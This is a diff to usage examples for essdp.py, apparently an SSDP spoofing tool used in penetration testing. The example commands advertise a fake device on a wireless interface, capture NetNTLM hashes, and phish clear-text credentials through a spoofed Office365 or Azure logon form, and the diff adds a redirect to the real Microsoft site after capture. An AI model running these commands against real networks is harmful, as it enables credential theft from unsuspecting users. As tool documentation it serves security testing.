@@ -25,11 +25,11 @@ Some example scenarios:
 
 ```
 # Use wlan0 for device advertisement and phishing, capturing NetNTLM and asking for clear-text
-# via a spoofed Office365 logon form:
-essdp.py wlan0 -t office365
+# via a spoofed Office365 logon form. Redirect to Microsoft aftering capturing credentials:
+essdp.py wlan0 -t office365 -u 'https://office.microsoft.com'
 
 # Same as above, but assuming your SMB server is running on another IP:
-essdp.py wlan0 -t office365 -s 192.168.1.205
+essdp.py wlan0 -t office365 -u 'https://office.microsoft.com' -s 192.168.1.205
 
 # Prompt for creds using basic auth and redirect to Azure:
 essdp.py wlan0 -t microsoft-azure -u 'https://azure.microsoft.com/auth/signin/' -b
